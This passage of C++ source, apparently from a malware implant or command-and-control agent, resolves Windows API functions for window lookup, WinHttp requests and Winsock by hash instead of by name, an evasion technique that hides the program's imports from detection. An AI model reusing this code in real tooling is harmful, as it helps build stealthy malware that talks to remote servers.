        pProcs->lpFindWindowW                   = reinterpret_cast<LPPROC_FINDWINDOWW>(pFindWindowW);
        PVOID pGetWindowThreadProcessId         = GetProcAddressByHash(hUser32, HASH_FUNC_GETWINDOWTHREADPROCESSID);
        pProcs->lpGetWindowThreadProcessId      = reinterpret_cast<LPPROC_GETWINDOWTHREADPROCESSID>(pGetWindowThreadProcessId);

        // WinHttp
        PVOID pWinHttpCloseHandle               = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPCLOSEHANDLE);
        pProcs->lpWinHttpCloseHandle            = reinterpret_cast<LPPROC_WINHTTPCLOSEHANDLE>(pWinHttpCloseHandle);
        PVOID pWinHttpConnect                   = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPCONNECT);
        pProcs->lpWinHttpConnect                = reinterpret_cast<LPPROC_WINHTTPCONNECT>(pWinHttpConnect);
        PVOID pWinHttpOpen                      = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPOPEN);
        pProcs->lpWinHttpOpen                   = reinterpret_cast<LPPROC_WINHTTPOPEN>(pWinHttpOpen);
        PVOID pWinHttpOpenRequest               = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPOPENREQUEST);
        pProcs->lpWinHttpOpenRequest            = reinterpret_cast<LPPROC_WINHTTPOPENREQUEST>(pWinHttpOpenRequest);
        PVOID pWinHttpQueryDataAvailable        = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPQUERYDATAAVAILABLE);
        pProcs->lpWinHttpQueryDataAvailable     = reinterpret_cast<LPPROC_WINHTTPQUERYDATAAVAILABLE>(pWinHttpQueryDataAvailable);
        PVOID pWinHttpQueryHeaders              = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPQUERYHEADERS);
        pProcs->lpWinHttpQueryHeaders           = reinterpret_cast<LPPROC_WINHTTPQUERYHEADERS>(pWinHttpQueryHeaders);
        PVOID pWinHttpReadData                  = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPREADDATA);
        pProcs->lpWinHttpReadData               = reinterpret_cast<LPPROC_WINHTTPREADDATA>(pWinHttpReadData);
        PVOID pWinHttpReceiveResponse           = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPRECEIVERESPONSE);
        pProcs->lpWinHttpReceiveResponse        = reinterpret_cast<LPPROC_WINHTTPRECEIVERESPONSE>(pWinHttpReceiveResponse);
        PVOID pWinHttpSendRequest               = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPSENDREQUEST);
        pProcs->lpWinHttpSendRequest            = reinterpret_cast<LPPROC_WINHTTPSENDREQUEST>(pWinHttpSendRequest);
        PVOID pWinHttpSetOption                 = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPSETOPTION);
        pProcs->lpWinHttpSetOption              = reinterpret_cast<LPPROC_WINHTTPSETOPTION>(pWinHttpSetOption);
        PVOID pWinHttpWriteData                 = GetProcAddressByHash(hWinHttp, HASH_FUNC_WINHTTPWRITEDATA);
        pProcs->lpWinHttpWriteData              = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);

        // Ws2_32
        PVOID pWSACleanup                       = GetProcAddressByHash(hWs2_32, HASH_FUNC_WSACLEANUP);
        pProcs->lpWSACleanup                    = reinterpret_cast<LPPROC_WSACLEANUP>(pWSACleanup);
        PVOID pWSAStartup                       = GetProcAddressByHash(hWs2_32, HASH_FUNC_WSASTARTUP);
        pProcs->lpWSAStartup                    = reinterpret_cast<LPPROC_WSASTARTUP>(pWSAStartup);          
    }
}